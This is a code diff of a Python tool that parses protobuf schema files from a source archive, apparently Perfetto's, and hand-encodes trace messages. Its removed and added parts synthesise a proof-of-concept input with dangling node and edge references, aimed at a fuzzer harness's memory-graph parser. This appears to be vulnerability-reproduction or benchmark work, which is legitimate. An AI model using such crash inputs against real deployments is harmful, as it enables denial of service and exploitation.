@@ -1,13 +1,308 @@
+import io
 import os
 import re
 import tarfile
-from dataclasses import dataclass, field
-from typing import Dict, List, Optional, Tuple, Iterable, Set
+import struct
+from dataclasses import dataclass
+from typing import Dict, List, Optional, Tuple, Set
 
 
-# ---------------- Protobuf encoder ----------------
+@dataclass(frozen=True)
+class FieldDef:
+    name: str
+    num: int
+    label: str  # "", "repeated", "optional", "required", "oneof"
+    type_str: str
 
-def _enc_varint(x: int) -> bytes:
+
+@dataclass
+class MsgDef:
+    full_name: str
+    fields: List[FieldDef]
+
+
+class ProtoIndex:
+    _SCALAR_TYPES: Set[str] = {
+        "double", "float",
+        "int32", "int64", "uint32", "uint64",
+        "sint32", "sint64",
+        "fixed32", "fixed64",
+        "sfixed32", "sfixed64",
+        "bool", "string", "bytes",
+    }
+
+    def __init__(self):
+        self.messages: Dict[str, MsgDef] = {}
+        self.short_to_fulls: Dict[str, List[str]] = {}
+
+    @staticmethod
+    def _strip_comments(text: str) -> str:
+        text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
+        text = re.sub(r"//[^\n]*", "", text)
+        return text
+
+    @staticmethod
+    def _tokenize(text: str) -> List[str]:
+        # Keep '.', identifiers, numbers, and punctuation useful for .proto parsing.
+        # Note: this is not a full proto parser; it's sufficient for message/field extraction.
+        token_re = re.compile(
+            r"""
+            [A-Za-z_][A-Za-z0-9_]* |
+            [0-9]+ |
+            \. |
+            \{ | \} | \< | \> | \= | \; | \[ | \] | \( | \) | , |
+            \"(?:\\.|[^"\\])*\" |
+            \'(?:\\.|[^'\\])*\' 
+            """,
+            re.X,
+        )
+        return token_re.findall(text)
+
+    def _register_message(self, full_name: str):
+        if full_name not in self.messages:
+            self.messages[full_name] = MsgDef(full_name=full_name, fields=[])
+            short = full_name.split(".")[-1]
+            self.short_to_fulls.setdefault(short, []).append(full_name)
+
+    def parse_proto_text(self, text: str):
+        text = self._strip_comments(text)
+        tokens = self._tokenize(text)
+        n = len(tokens)
+        i = 0
+        package = ""
+        scope_stack: List[Tuple[str, str]] = []  # (kind, name) where kind is 'message' or 'oneof'
+        current_message_full: Optional[str] = None
+
+        def current_message_scope_names() -> List[str]:
+            return [name for kind, name in scope_stack if kind == "message"]
+
+        def set_current_message():
+            nonlocal current_message_full
+            msg_names = current_message_scope_names()
+            if not msg_names:
+                current_message_full = None
+                return
+            full = ".".join([p for p in [package] if p] + msg_names)
+            current_message_full = full
+            self._register_message(full)
+
+        def skip_to_semicolon(pos: int) -> int:
+            while pos < n and tokens[pos] != ";":
+                pos += 1
+            return min(pos + 1, n)
+
+        def skip_block(pos: int) -> int:
+            # assumes current token is '{' or points to token just after it
+            depth = 0
+            while pos < n:
+                if tokens[pos] == "{":
+                    depth += 1
+                elif tokens[pos] == "}":
+                    depth -= 1
+                    if depth <= 0:
+                        return pos + 1
+                pos += 1
+            return n
+
+        def parse_qualified_name(pos: int) -> Tuple[str, int]:
+            # Parses something like foo.bar.Baz from tokens (identifiers separated by '.')
+            parts = []
+            if pos < n and tokens[pos] == ".":
+                parts.append(".")
+                pos += 1
+            if pos >= n or not re.match(r"^[A-Za-z_]", tokens[pos]):
+                return "", pos
+            parts.append(tokens[pos])
+            pos += 1
+            while pos + 1 < n and tokens[pos] == "." and re.match(r"^[A-Za-z_]", tokens[pos + 1]):
+                parts.append(".")
+                parts.append(tokens[pos + 1])
+                pos += 2
+            return "".join(parts), pos
+
+        def parse_type(pos: int) -> Tuple[str, int]:
+            # Handles map<...> and qualified names.
+            if pos < n and tokens[pos] == "map":
+                # consume map< K , V >
+                start = pos
+                while pos < n and tokens[pos] != ">":
+                    pos += 1
+                pos = min(pos + 1, n)
+                return "".join(tokens[start:pos]), pos
+            tname, pos2 = parse_qualified_name(pos)
+            if tname:
+                return tname, pos2
+            return "", pos
+
+        while i < n:
+            tok = tokens[i]
+
+            if tok == "package":
+                name, j = parse_qualified_name(i + 1)
+                package = name.lstrip(".")
+                i = skip_to_semicolon(j)
+                continue
+
+            if tok == "message":
+                if i + 1 < n and re.match(r"^[A-Za-z_]", tokens[i + 1]):
+                    msg_name = tokens[i + 1]
+                    scope_stack.append(("message", msg_name))
+                    # Advance to '{'
+                    i += 2
+                    while i < n and tokens[i] != "{":
+                        i += 1
+                    if i < n and tokens[i] == "{":
+                        i += 1
+                    set_current_message()
+                    continue
+
+            if tok == "oneof":
+                if i + 1 < n and re.match(r"^[A-Za-z_]", tokens[i + 1]):
+                    oneof_name = tokens[i + 1]
+                    scope_stack.append(("oneof", oneof_name))
+                    i += 2
+                    while i < n and tokens[i] != "{":
+                        i += 1
+                    if i < n and tokens[i] == "{":
+                        i += 1
+                    set_current_message()
+                    continue
+
+            if tok == "enum":
+                # skip enum block
+                i += 1
+                while i < n and tokens[i] != "{":
+                    i += 1
+                if i < n and tokens[i] == "{":
+                    i = skip_block(i)
+                continue
+
+            if tok in {"option", "import", "syntax", "reserved", "extensions", "extend"}:
+                # 'extend' has a block; others usually end with ';'
+                if tok == "extend":
+                    i += 1
+                    while i < n and tokens[i] != "{":
+                        i += 1
+                    if i < n and tokens[i] == "{":
+                        i = skip_block(i)
+                else:
+                    i = skip_to_semicolon(i + 1)
+                continue
+
+            if tok == "}":
+                # pop one scope (message or oneof)
+                if scope_stack:
+                    scope_stack.pop()
+                i += 1
+                set_current_message()
+                continue
+
+            # Attempt to parse a field in the current message scope.
+            if current_message_full is not None:
+                label = ""
+                pos = i
+                if tokens[pos] in {"repeated", "optional", "required"}:
+                    label = tokens[pos]
+                    pos += 1
+
+                # parse type
+                type_str, pos = parse_type(pos)
+                if not type_str:
+                    i += 1
+                    continue
+
+                # field name
+                if pos < n and re.match(r"^[A-Za-z_]", tokens[pos]):
+                    fname = tokens[pos]
+                    pos += 1
+                else:
+                    i += 1
+                    continue
+
+                # '=' number
+                if pos < n and tokens[pos] == "=" and pos + 1 < n and tokens[pos + 1].isdigit():
+                    fnum = int(tokens[pos + 1])
+                    pos += 2
+                else:
+                    i += 1
+                    continue
+
+                # skip field options until ';'
+                pos = skip_to_semicolon(pos)
+
+                # if inside oneof, mark label as oneof (unless repeated etc)
+                in_oneof = any(kind == "oneof" for kind, _ in scope_stack)
+                if in_oneof and label == "":
+                    label = "oneof"
+
+                self.messages[current_message_full].fields.append(
+                    FieldDef(name=fname, num=fnum, label=label, type_str=type_str)
+                )
+                i = pos
+                continue
+
+            i += 1
+
+    def _short_name(self, full_name: str) -> str:
+        return full_name.split(".")[-1]
+
+    def is_scalar_type(self, type_str: str) -> bool:
+        if not type_str:
+            return True
+        if type_str.startswith("map<"):
+            return True
+        t = type_str.lstrip(".")
+        if t in self._SCALAR_TYPES:
+            return True
+        # Heuristic: treat unknown as scalar unless it matches a message we know.
+        if t in self.messages:
+            return False
+        if self._short_name(t) in self.short_to_fulls:
+            return False
+        return False if t in self.short_to_fulls else True
+
+    def resolve_message_type_candidates(self, type_str: str, context_msg_full: str) -> List[str]:
+        if not type_str:
+            return []
+        if type_str.startswith("map<"):
+            return []
+        t = type_str
+        if t.startswith("."):
+            full = t[1:]
+            if full in self.messages:
+                return [full]
+            # if full includes leading package but differs, try suffix match
+            short = full.split(".")[-1]
+            return self.short_to_fulls.get(short, [])[:]
+        # unqualified name: could be nested in context or same package, or global
+        short = t.split(".")[-1]
+        candidates = self.short_to_fulls.get(short, [])
+        if not candidates:
+            return []
+        # Prefer same package prefix
+        pkg = context_msg_full.rsplit(".", 1)[0] if "." in context_msg_full else ""
+        preferred = [c for c in candidates if pkg and c.startswith(pkg + ".")]
+        if preferred:
+            return preferred
+        return candidates[:]
+
+    def find_messages_ending_with(self, suffix: str) -> List[str]:
+        return [k for k in self.messages.keys() if k.endswith(suffix)]
+
+    def build_adjacency(self) -> Dict[str, List[Tuple[int, str, str]]]:
+        # msg -> list of (field_num, field_name, child_msg_full)
+        adj: Dict[str, List[Tuple[int, str, str]]] = {}
+        for mname, mdef in self.messages.items():
+            edges: List[Tuple[int, str, str]] = []
+            for f in mdef.fields:
+                cands = self.resolve_message_type_candidates(f.type_str, mname)
+                for c in cands:
+                    edges.append((f.num, f.name, c))
+            adj[mname] = edges
+        return adj
+
+
+def _encode_varint(x: int) -> bytes:
     if x < 0:
         x &= (1 << 64) - 1
     out = bytearray()
@@ -22,706 +317,572 @@ def _enc_varint(x: int) -> bytes:
     return bytes(out)
 
 
-def _enc_tag(field_num: int, wire_type: int) -> bytes:
-    return _enc_varint((field_num << 3) | wire_type)
+def _encode_key(field_num: int, wire_type: int) -> bytes:
+    return _encode_varint((field_num << 3) | wire_type)
 
 
-def _enc_field_varint(field_num: int, value: int) -> bytes:
-    return _enc_tag(field_num, 0) + _enc_varint(value)
+def _encode_uint(field_num: int, value: int) -> bytes:
+    return _encode_key(field_num, 0) + _encode_varint(value)
 
 
-def _enc_field_bytes(field_num: int, payload: bytes) -> bytes:
-    return _enc_tag(field_num, 2) + _enc_varint(len(payload)) + payload
+def _encode_fixed32(field_num: int, value: int) -> bytes:
+    return _encode_key(field_num, 5) + struct.pack("<I", value & 0xFFFFFFFF)
 
 
-# ---------------- Proto parser ----------------
-
-_VARINT_SCALARS = {
-    "int32", "int64", "uint32", "uint64", "sint32", "sint64",
-    "bool", "enum",
-}
-_WIRE1_SCALARS = {"fixed64", "sfixed64", "double"}
-_WIRE5_SCALARS = {"fixed32", "sfixed32", "float"}
-_LEN_SCALARS = {"string", "bytes"}
+def _encode_fixed64(field_num: int, value: int) -> bytes:
+    return _encode_key(field_num, 1) + struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)
 
 
-def _strip_comments(s: str) -> str:
-    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
-    s = re.sub(r"//[^\n\r]*", "", s)
-    return s
+def _encode_bytes(field_num: int, payload: bytes) -> bytes:
+    return _encode_key(field_num, 2) + _encode_varint(len(payload)) + payload
 
 
-_TOKEN_RE = re.compile(r"""
-    [A-Za-z_][A-Za-z0-9_\.]* |
-    \d+ |
-    [{}\[\];=<>(),]
-""", re.X)
+def _encode_string(field_num: int, s: str) -> bytes:
+    return _encode_bytes(field_num, s.encode("utf-8", errors="ignore"))
 
 
-def _tokenize(s: str) -> List[str]:
-    return _TOKEN_RE.findall(s)
+def _varint_type(t: str) -> bool:
+    t = t.lstrip(".")
+    return t in {"int32", "int64", "uint32", "uint64", "sint32", "sint64", "bool"} or t == "enum"
 
 
-@dataclass
-class FieldDef:
-    name: str
-    number: int
-    type_name: str
-    label: str = ""  # "repeated", "optional", "required", or ""
-    wire_type: int = 2  # 0/1/2/5
-    is_message: bool = True
+def _fixed32_type(t: str) -> bool:
+    t = t.lstrip(".")
+    return t in {"fixed32", "sfixed32", "float"}
 
 
-@dataclass
-class MessageDef:
-    full_name: str
-    simple_name: str
-    package: str
-    fields: Dict[str, FieldDef] = field(default_factory=dict)
-
-    def get_field_ci(self, name: str) -> Optional[FieldDef]:
-        n = name.lower()
-        for k, v in self.fields.items():
-            if k.lower() == n:
-                return v
-        return None
+def _fixed64_type(t: str) -> bool:
+    t = t.lstrip(".")
+    return t in {"fixed64", "sfixed64", "double"}
 
 
-class ProtoDB:
-    def __init__(self) -> None:
-        self.by_full: Dict[str, MessageDef] = {}
-        self.by_simple: Dict[str, List[MessageDef]] = {}
-
-    def add_message(self, m: MessageDef) -> None:
-        self.by_full[m.full_name] = m
-        self.by_simple.setdefault(m.simple_name, []).append(m)
-
-    def resolve_message(self, type_name: str, prefer_package: Optional[str] = None) -> Optional[MessageDef]:
-        t = type_name.strip()
-        if not t:
-            return None
-        if t.startswith("."):
-            t = t[1:]
-            if t in self.by_full:
-                return self.by_full[t]
-            # fallback: match by suffix
-            cand = [m for fn, m in self.by_full.items() if fn.endswith("." + t) or fn == t]
-            if prefer_package:
-                cand2 = [m for m in cand if m.package == prefer_package]
-                if cand2:
-                    cand = cand2
-            if cand:
-                cand.sort(key=lambda m: (0 if "perfetto" in m.full_name.lower() else 1, len(m.full_name)))
-                return cand[0]
-            return None
-
-        # simple name resolution
-        simple = t.split(".")[-1]
-        cand = self.by_simple.get(simple, [])
-        if not cand:
-            # try suffix match
-            cand = [m for m in self.by_full.values() if m.full_name.endswith("." + t)]
-        if not cand:
-            return None
-        if prefer_package:
-            cand2 = [m for m in cand if m.package == prefer_package]
-            if cand2:
-                cand = cand2
-        cand.sort(key=lambda m: (0 if "perfetto" in m.full_name.lower() else 1, len(m.full_name)))
-        return cand[0]
+def _string_type(t: str) -> bool:
+    t = t.lstrip(".")
+    return t == "string"
 
 
-def _infer_wire_and_kind(type_name: str) -> Tuple[int, bool]:
-    t = type_name.strip()
-    if t.startswith("."):
-        t = t[1:]
-    t_simple = t.split(".")[-1]
-    if t_simple in _VARINT_SCALARS:
-        return 0, False
-    if t_simple in _WIRE1_SCALARS:
-        return 1, False
-    if t_simple in _WIRE5_SCALARS:
-        return 5, False
-    if t_simple in _LEN_SCALARS:
-        return 2, False
-    if t_simple == "map":
-        return 2, True
-    # treat all other as message
-    return 2, True
+def _bytes_type(t: str) -> bool:
+    t = t.lstrip(".")
+    return t == "bytes"
 
 
-def _parse_type(tokens: List[str], idx: int) -> Tuple[str, int]:
-    if idx >= len(tokens):
-        return "", idx
-    if tokens[idx] == "map" and idx + 1 < len(tokens) and tokens[idx + 1] == "<":
-        # consume until matching '>'
-        depth = 0
-        j = idx
-        parts = []
-        while j < len(tokens):
-            tok = tokens[j]
-            parts.append(tok)
-            if tok == "<":
-                depth += 1
-            elif tok == ">":
-                depth -= 1
-                if depth == 0:
-                    j += 1
-                    break
-            j += 1
-        return "".join(parts), j
-    return tokens[idx], idx + 1
-
-
-def parse_protos(file_items: Iterable[Tuple[str, bytes]]) -> ProtoDB:
-    db = ProtoDB()
-    for path, data in file_items:
-        if not path.endswith(".proto"):
-            continue
-        try:
-            text = data.decode("utf-8", errors="ignore")
-        except Exception:
-            continue
-        if "message" not in text:
-            continue
-        text = _strip_comments(text)
-        toks = _tokenize(text)
-        if not toks:
-            continue
-
-        pkg = ""
-        i = 0
-        stack: List[Dict] = []
-        pending: Optional[Tuple[str, str]] = None  # (kind, name)
-        while i < len(toks):
-            tok = toks[i]
-            if tok == "package" and i + 1 < len(toks):
-                pkg = toks[i + 1]
-                # skip to ';'
-                i += 2
-                while i < len(toks) and toks[i] != ";":
-                    i += 1
-                if i < len(toks) and toks[i] == ";":
-                    i += 1
-                continue
-
-            if tok in ("import", "option", "syntax"):
-                # skip to ';'
-                i += 1
-                while i < len(toks) and toks[i] != ";":
-                    i += 1
-                if i < len(toks) and toks[i] == ";":
-                    i += 1
-                continue
-
-            if tok == "message" and i + 1 < len(toks):
-                pending = ("message", toks[i + 1])
-                i += 2
-                continue
-            if tok == "enum" and i + 1 < len(toks):
-                pending = ("enum", toks[i + 1])
-                i += 2
-                continue
-            if tok == "oneof" and i + 1 < len(toks):
-                # only meaningful if inside a message
-                in_msg = any(ctx.get("kind") == "message" for ctx in stack)
-                if in_msg:
-                    pending = ("oneof", toks[i + 1])
-                i += 2
-                continue
-
-            if tok == "{":
-                if pending:
-                    kind, name = pending
-                    pending = None
-                    if kind == "message":
-                        scopes = [ctx["name"] for ctx in stack if ctx.get("kind") == "message"]
-                        full = ".".join([p for p in ([pkg] if pkg else []) + scopes + [name] if p])
-                        mdef = MessageDef(full_name=full, simple_name=name, package=pkg)
-                        db.add_message(mdef)
-                        stack.append({"kind": "message", "name": name, "msg": mdef})
-                    elif kind == "oneof":
-                        stack.append({"kind": "oneof", "name": name})
-                    else:  # enum
-                        stack.append({"kind": "enum", "name": name})
-                else:
-                    stack.append({"kind": "other"})
-                i += 1
-                continue
-
-            if tok == "}":
-                if stack:
-                    stack.pop()
-                i += 1
-                continue
-
-            # Field parsing inside message (including within oneof), not inside enum.
-            in_enum = any(ctx.get("kind") == "enum" for ctx in stack)
-            msg_ctx = None
-            for ctx in reversed(stack):
-                if ctx.get("kind") == "message":
-                    msg_ctx = ctx
-                    break
-            if msg_ctx and not in_enum:
-                # skip non-field statements
-                if tok in ("extensions", "reserved", "extend", "option", "message", "enum", "oneof", "group"):
-                    # skip to ';' or '{'
-                    i += 1
-                    while i < len(toks) and toks[i] not in (";", "{", "}"):
-                        i += 1
-                    if i < len(toks) and toks[i] == ";":
-                        i += 1
-                    continue
-
-                start_i = i
-                label = ""
-                if tok in ("optional", "required", "repeated"):
-                    label = tok
-                    i += 1
-                    if i >= len(toks):
-                        break
-                    type_name, i2 = _parse_type(toks, i)
-                else:
-                    type_name, i2 = _parse_type(toks, i)
-
-                if not type_name or i2 >= len(toks):
-                    i = start_i + 1
-                    continue
-                name_tok = toks[i2] if i2 < len(toks) else ""
-                if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", name_tok or ""):
-                    i = start_i + 1
-                    continue
-                i3 = i2 + 1
-                if i3 >= len(toks) or toks[i3] != "=":
-                    i = start_i + 1
-                    continue
-                if i3 + 1 >= len(toks) or not toks[i3 + 1].isdigit():
-                    i = start_i + 1
-                    continue
-                fnum = int(toks[i3 + 1])
-                wire, is_msg = _infer_wire_and_kind(type_name if not type_name.startswith("map") else "map")
-                fdef = FieldDef(
-                    name=name_tok,
-                    number=fnum,
-                    type_name=type_name,
-                    label=label,
-                    wire_type=wire,
-                    is_message=is_msg,
-                )
-                msg_ctx["msg"].fields[name_tok] = fdef
-
-                # advance to ';'
-                j = i3 + 2
-                while j < len(toks) and toks[j] != ";":
-                    # stop at '{' to avoid consuming a nested block incorrectly
-                    if toks[j] in ("{", "}"):
-                        break
-                    j += 1
-                if j < len(toks) and toks[j] == ";":
-                    i = j + 1
-                else:
-                    i = start_i + 1
-                continue
-
-            i += 1
-    return db
-
-
-# ---------------- PoC synthesis ----------------
-
-def _find_field_by_patterns(
-    msg: MessageDef,
-    patterns: List[str],
-    *,
-    require_wire: Optional[int] = None,
-    require_label: Optional[str] = None,
-    must_be_message: Optional[bool] = None,
-) -> Optional[FieldDef]:
-    pats = [p.lower() for p in patterns]
-    best = None
-    best_rank = (10**9, 10**9)
-    for f in msg.fields.values():
-        nm = f.name.lower()
-        if require_wire is not None and f.wire_type != require_wire:
-            continue
-        if require_label is not None and (f.label != require_label):
-            continue
-        if must_be_message is not None and f.is_message != must_be_message:
-            continue
-        hit = False
-        rank = 10**9
-        for idx, p in enumerate(pats):
-            if p and p in nm:
-                hit = True
-                rank = min(rank, idx)
-        if not hit:
-            continue
-        tie = (rank, f.number)
-        if tie < best_rank:
-            best_rank = tie
-            best = f
-    return best
-
-
-def _find_id_field(msg: MessageDef) -> Optional[FieldDef]:
-    return _find_field_by_patterns(
-        msg,
-        ["id", "guid", "node_id", "dump_id", "object_id", "allocation_id", "track_id"],
-        require_wire=0,
-        must_be_message=False,
-    )
-
-
-def _find_ref_list_field_in_node(msg: MessageDef) -> Optional[FieldDef]:
-    # repeated scalar varint list of ids
-    # (proto3 repeated uint64 ... uses label="repeated")
-    return _find_field_by_patterns(
-        msg,
-        ["reference", "references", "ref", "child", "children", "edge", "edges", "target", "to", "parent"],
-        require_wire=0,
-        require_label="repeated",
-        must_be_message=False,
-    )
-
-
-def _find_edge_id_fields(edge_msg: MessageDef) -> Tuple[Optional[FieldDef], Optional[FieldDef]]:
-    src = _find_field_by_patterns(
-        edge_msg,
-        ["source_id", "src_id", "from_id", "source", "src", "from", "owner_id", "parent_id"],
-        require_wire=0,
-        must_be_message=False,
-    )
-    dst = _find_field_by_patterns(
-        edge_msg,
-        ["target_id", "dst_id", "to_id", "target", "dst", "to", "owned_id", "child_id"],
-        require_wire=0,
-        must_be_message=False,
-    )
-    # if they are the same or missing, try generic second-best id-like fields
-    if src and dst and src.number == dst.number:
-        dst = None
-    return src, dst
-
-
-def _maybe_add_pid_like_fields(msg: MessageDef) -> bytes:
-    # Keep minimal: add only one pid-ish field if present.
-    f = _find_field_by_patterns(
-        msg,
-        ["pid", "process_id", "tgid", "upid", "process", "pid_id"],
-        require_wire=0,
-        must_be_message=False,
-    )
-    if f:
-        return _enc_field_varint(f.number, 1)
+def _encode_scalar_field(f: FieldDef, value: int) -> bytes:
+    t = f.type_str
+    if _varint_type(t):
+        return _encode_uint(f.num, value)
+    if _fixed32_type(t):
+        return _encode_fixed32(f.num, value)
+    if _fixed64_type(t):
+        return _encode_fixed64(f.num, value)
+    if _string_type(t):
+        return _encode_string(f.num, str(value))
+    if _bytes_type(t):
+        return _encode_bytes(f.num, _encode_varint(value))
     return b""
 
 
-def _is_message_field(f: FieldDef) -> bool:
-    if f.wire_type != 2:
-        return False
-    t = f.type_name.strip()
-    if t.startswith("map<"):
-        return False
-    t_simple = t[1:].split(".")[-1] if t.startswith(".") else t.split(".")[-1]
-    if t_simple in _LEN_SCALARS:
-        return False
-    return True
-
-
-def _candidate_score(msg: MessageDef) -> int:
-    name = msg.simple_name.lower()
-    s = 0
-    if "memory" in name:
-        s += 4
-    if "snapshot" in name:
-        s += 4
-    if "dump" in name:
-        s += 4
-    if "heap" in name or "graph" in name:
-        s += 2
-    # field name hints
-    for f in msg.fields.values():
-        fn = f.name.lower()
-        if "allocator_dump" in fn:
-            s += 3
-        if "edge" in fn:
-            s += 2
-        if "node" in fn or "dump" in fn:
-            s += 1
-    return s
-
-
-def _craft_invalid_reference_in_message(db: ProtoDB, msg: MessageDef) -> Optional[bytes]:
-    # Find a repeated submessage field that looks like a node list.
-    # And either a repeated edge list, or a repeated reference list within node.
-    node_fields: List[Tuple[int, FieldDef, MessageDef, FieldDef]] = []
-    for f in msg.fields.values():
-        if f.label != "repeated":
-            continue
-        if not _is_message_field(f):
-            continue
-        child = db.resolve_message(f.type_name, prefer_package=msg.package)
-        if not child:
-            continue
-        idf = _find_id_field(child)
-        if not idf:
-            continue
-        # prioritize fields by name
-        pri = 0
-        fn = f.name.lower()
-        if "allocator_dump" in fn:
-            pri -= 50
-        if "dump" in fn:
-            pri -= 10
-        if "node" in fn:
-            pri -= 8
-        if "object" in fn:
-            pri -= 6
-        node_fields.append((pri, f, child, idf))
-    node_fields.sort(key=lambda x: (x[0], x[1].number))
-    if not node_fields:
-        return None
-
-    # Find edge field candidates
-    edge_fields: List[Tuple[int, FieldDef, MessageDef, Optional[FieldDef], Optional[FieldDef]]] = []
-    for f in msg.fields.values():
-        if f.label != "repeated":
-            continue
-        if not _is_message_field(f):
-            continue
-        child = db.resolve_message(f.type_name, prefer_package=msg.package)
-        if not child:
-            continue
-        src, dst = _find_edge_id_fields(child)
-        # also accept single-id edge references (less ideal)
-        if not (src or dst):
-            continue
-        pri = 0
-        fn = f.name.lower()
-        if "allocator_dump_edge" in fn:
-            pri -= 50
-        if "edge" in fn:
-            pri -= 15
-        edge_fields.append((pri, f, child, src, dst))
-    edge_fields.sort(key=lambda x: (x[0], x[1].number))
-
-    # Try node-internal references first (often smallest) if available
-    for _, node_f, node_msg, node_idf in node_fields[:5]:
-        ref_f = _find_ref_list_field_in_node(node_msg)
-        if ref_f:
-            node_bytes = _enc_field_varint(node_idf.number, 1) + _enc_field_varint(ref_f.number, 2)
-            msg_bytes = _maybe_add_pid_like_fields(msg) + _enc_field_bytes(node_f.number, node_bytes)
-            return msg_bytes
-
-    # Try separate edges
-    for _, node_f, node_msg, node_idf in node_fields[:5]:
-        node_bytes = _enc_field_varint(node_idf.number, 1)
-        node_part = _enc_field_bytes(node_f.number, node_bytes)
-        for _, edge_f, edge_msg, src_f, dst_f in edge_fields[:8]:
-            edge_parts = bytearray()
-            if src_f:
-                edge_parts += _enc_field_varint(src_f.number, 1)
-            if dst_f:
-                edge_parts += _enc_field_varint(dst_f.number, 2)
-            else:
-                # if only one of (src/dst) found, set that one to missing id
-                if src_f and not dst_f:
-                    edge_parts = bytearray(_enc_field_varint(src_f.number, 2))
-            if not edge_parts:
-                continue
-            edge_part = _enc_field_bytes(edge_f.number, bytes(edge_parts))
-            msg_bytes = _maybe_add_pid_like_fields(msg) + node_part + edge_part
-            return msg_bytes
-
-    return None
-
-
-def _build_adjacency(db: ProtoDB) -> Dict[str, List[Tuple[FieldDef, MessageDef]]]:
-    adj: Dict[str, List[Tuple[FieldDef, MessageDef]]] = {}
-    for m in db.by_full.values():
-        edges = []
-        for f in m.fields.values():
-            if not _is_message_field(f):
-                continue
-            child = db.resolve_message(f.type_name, prefer_package=m.package)
-            if not child:
-                continue
-            edges.append((f, child))
-        if edges:
-            adj[m.full_name] = edges
-    return adj
-
-
-def _bfs_path(
-    adj: Dict[str, List[Tuple[FieldDef, MessageDef]]],
-    start: MessageDef,
-    target: MessageDef
-) -> Optional[List[Tuple[MessageDef, FieldDef, MessageDef]]]:
-    if start.full_name == target.full_name:
-        return []
-    q: List[str] = [start.full_name]
-    prev: Dict[str, Tuple[str, FieldDef, str]] = {}
-    seen: Set[str] = {start.full_name}
-    while q:
-        cur = q.pop(0)
-        for f, child in adj.get(cur, []):
-            nxt = child.full_name
-            if nxt in seen:
-                continue
-            seen.add(nxt)
-            prev[nxt] = (cur, f, nxt)
-            if nxt == target.full_name:
-                q.clear()
-                break
-            q.append(nxt)
-    if target.full_name not in prev:
-        return None
-
-    # reconstruct
-    path_rev: List[Tuple[str, FieldDef, str]] = []
-    cur = target.full_name
-    while cur != start.full_name:
-        pcur, f, nxt = prev[cur]
-        path_rev.append((pcur, f, nxt))
-        cur = pcur
-    path_rev.reverse()
-
-    # map to MessageDefs
-    result: List[Tuple[MessageDef, FieldDef, MessageDef]] = []
-    for pcur, f, nxt in path_rev:
-        pm = db.by_full.get(pcur)
-        cm = db.by_full.get(nxt)
-        if not pm or not cm:
-            return None
-        result.append((pm, f, cm))
-    return result
-
-
-def _wrap_along_path(
-    db: ProtoDB,
-    path: List[Tuple[MessageDef, FieldDef, MessageDef]],
-    payload: bytes
-) -> bytes:
-    # path is (parent, field, child), starting from TracePacket down to target.
-    # Wrap from bottom up excluding TracePacket itself; then set on TracePacket.
-    if not path:
-        return payload
-    cur_bytes = payload
-    # Build each child wrapper moving upward: for each step, construct parent message that only contains field pointing to child
-    # We do this from the deepest parent (just above payload) up to TracePacket.
-    for parent, fielddef, child in reversed(path):
-        parent_bytes = _maybe_add_pid_like_fields(parent) + _enc_field_bytes(fielddef.number, cur_bytes)
-        cur_bytes = parent_bytes
-    # After processing all reversed steps, cur_bytes is actually a TracePacket message (since first parent in path is TracePacket)
-    return cur_bytes
-
-
-def _find_trace_and_packet(db: ProtoDB) -> Tuple[Optional[MessageDef], Optional[MessageDef], int]:
-    tp = db.resolve_message("TracePacket")
-    tr = db.resolve_message("Trace")
-    packet_field_num = 1
-    if tr and tp:
-        # find repeated field in Trace with type TracePacket
-        best = None
-        for f in tr.fields.values():
-            if f.wire_type != 2:
-                continue
-            if not _is_message_field(f):
-                continue
-            child = db.resolve_message(f.type_name, prefer_package=tr.package)
-            if child and child.simple_name == "TracePacket":
-                if best is None or f.number < best.number:
-                    best = f
-        if best:
-            packet_field_num = best.number
-    return tr, tp, packet_field_num
-
-
-def _iter_tar_or_dir_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
-    if os.path.isdir(src_path):
-        for root, _, files in os.walk(src_path):
-            for fn in files:
-                if fn.endswith(".proto"):
-                    p = os.path.join(root, fn)
-                    try:
-                        with open(p, "rb") as f:
-                            yield (os.path.relpath(p, src_path), f.read())
-                    except Exception:
-                        continue
-        return
-
+def _read_tar_members(src_path: str, max_file_size: int = 2_500_000) -> Dict[str, bytes]:
+    out: Dict[str, bytes] = {}
     with tarfile.open(src_path, "r:*") as tf:
         for m in tf.getmembers():
-            if not m.isreg():
+            if not m.isfile():
+                continue
+            if m.size <= 0 or m.size > max_file_size:
                 continue
             name = m.name
-            if not name.endswith(".proto"):
-                continue
-            if m.size <= 0 or m.size > 5_000_000:
-                continue
             try:
                 f = tf.extractfile(m)
                 if not f:
                     continue
                 data = f.read()
-                yield (name, data)
             except Exception:
                 continue
+            out[name] = data
+    return out
+
+
+def _decode_text(b: bytes) -> str:
+    return b.decode("utf-8", errors="ignore")
+
+
+def _extract_hints_from_cpp(cpp_texts: Dict[str, str]) -> List[str]:
+    hints: List[str] = []
+    decoder_pat = re.compile(r"pbzero::([A-Za-z_][A-Za-z0-9_]*)::Decoder")
+    decoder_pat2 = re.compile(r"protos::(?:pbzero::)?([A-Za-z_][A-Za-z0-9_]*)::Decoder")
+    for path, txt in cpp_texts.items():
+        if "node_id_map" not in txt:
+            continue
+        # Gather decoder types near node_id_map occurrences
+        for m in re.finditer(r"node_id_map", txt):
+            lo = max(0, m.start() - 1200)
+            hi = min(len(txt), m.end() + 1200)
+            window = txt[lo:hi]
+            for pat in (decoder_pat, decoder_pat2):
+                for dm in pat.finditer(window):
+                    hints.append(dm.group(1))
+        # Also global hints in file
+        for dm in decoder_pat.finditer(txt):
+            hints.append(dm.group(1))
+    # Normalize and score by frequency
+    freq: Dict[str, int] = {}
+    for h in hints:
+        if h in {"Decoder", "ProtoDecoder"}:
+            continue
+        freq[h] = freq.get(h, 0) + 1
+    ordered = sorted(freq.items(), key=lambda kv: (-kv[1], kv[0]))
+    return [k for k, _ in ordered]
+
+
+def _detect_top_level(cpp_texts: Dict[str, str]) -> str:
+    # Returns one of: "Trace", "TracePacket", "Unknown"
+    for _, txt in cpp_texts.items():
+        if "LLVMFuzzerTestOneInput" not in txt:
+            continue
+        t = txt
+        if "TraceProcessor" in t or "trace_processor" in t or ".Parse(" in t and "TracePacket::Decoder" not in t:
+            return "Trace"
+        if "TracePacket::Decoder" in t or "pbzero::TracePacket::Decoder" in t:
+            return "TracePacket"
+    # Common harness: trace_processor parses Trace-encoded stream.
+    return "Trace"
+
+
+def _score_graph_like_message(pidx: ProtoIndex, msg_full: str) -> int:
+    mdef = pidx.messages.get(msg_full)
+    if not mdef:
+        return -10**9
